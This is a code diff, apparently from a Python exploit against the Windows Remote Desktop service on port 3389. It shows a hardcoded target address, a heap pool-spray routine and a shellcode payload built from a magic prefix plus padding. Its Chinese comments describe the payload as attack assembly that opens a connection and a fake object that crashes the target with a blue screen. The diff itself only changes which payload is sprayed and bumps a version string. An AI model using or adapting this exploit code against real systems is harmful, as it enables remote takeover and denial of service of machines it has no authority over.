@@ -28,7 +28,7 @@ def pool_spray(s, crypter, payload):
 def main():
 
 
-    print("正在使用新代码 直接上传 4")
+    print("正在使用新代码 直接上传 5")
     # change to your target
     host = '192.168.1.106'
     port = 3389
@@ -172,15 +172,15 @@ def main():
     # payload = b'\x2c\xf0\x4f\x87' + shellcode
     # payload = payload + b'\x5a' * (payload_size - len(payload))
 
-    payload_size = 1600
-    payload = b'\x2c\xf0\x4f\x87' + outCode
-    payload = payload + b'\x5a' * (payload_size - len(payload))
+    # payload_size = 1600
+    # payload = b'\x2c\xf0\x4f\x87' + outCode
+    # payload = payload + b'\x5a' * (payload_size - len(payload))
     # payload 攻击汇编语句 用于建立连接
     # crypter 建立连接后返回的结构体
     # fake_obj 攻击汇编语句 用于蓝屏
     print('[+] spraying pool')
-    pool_spray(s, crypter, payload)
-    # pool_spray(s, crypter, outCode)
+    # pool_spray(s, crypter, payload)
+    pool_spray(s, crypter, outCode)
 
     ###################################################
 
